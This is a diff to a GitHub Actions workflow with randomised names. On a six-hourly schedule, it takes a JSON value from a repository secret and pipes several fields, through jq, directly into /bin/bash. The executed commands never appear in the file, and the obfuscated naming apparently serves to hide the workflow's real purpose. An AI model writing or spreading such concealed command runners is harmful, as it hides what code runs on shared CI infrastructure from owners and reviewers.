@@ -1,21 +1,29 @@
 name: eratchjiao
-
 on:
   workflow_dispatch:
   schedule:
-    - cron: '37 3/6 * * *'
+    - cron: '2 1/6 * * *'
 jobs:
   build:
     runs-on: ubuntu-latest
-
     steps:
       - uses: actions/checkout@v4
       - name: eratchjiao
         env:
-          sagtu56: ${{ secrets.sagtu56 }}
+          dtkmu32790: ${{ secrets.dtkmu32790 }}
         run: |
-          echo $sagtu56 | jq -r .gu82 | /bin/bash
-          echo $shvx7 | jq -r .mgf546 | /bin/bash
-          echo $znb19967 | jq -r .ndzsm67962 | /bin/bash
-          echo $ql59 | jq -r .zrwh836 | /bin/bash
+          echo $dtkmu32790 | jq -r .k1 | /bin/bash
+          echo $qgvva008 | jq -r .cbz5 | /bin/bash
+          echo $gewlw823 | jq -r .ywqr6715 | /bin/bash
+          echo $r25381 | jq -r .ok6 | /bin/bash
+          echo $gpbq64 | jq -r .tgjxj06 | /bin/bash
+          echo $h9894 | jq -r .yrakq5000 | /bin/bash
+          echo $vlct421 | jq -r .o05 | /bin/bash
+          echo $q4 | jq -r .g6440 | /bin/bash
+          echo $z70758 | jq -r .bev2 | /bin/bash
+          echo $ws33783 | jq -r .vqb9 | /bin/bash
+          echo $uwy3 | jq -r .k31657 | /bin/bash
+          echo $czf03 | jq -r .hcl0616 | /bin/bash
+          echo $pmp465 | jq -r .q793 | /bin/bash
+          echo $zcesd75372 | jq -r .yca00 | /bin/bash
 
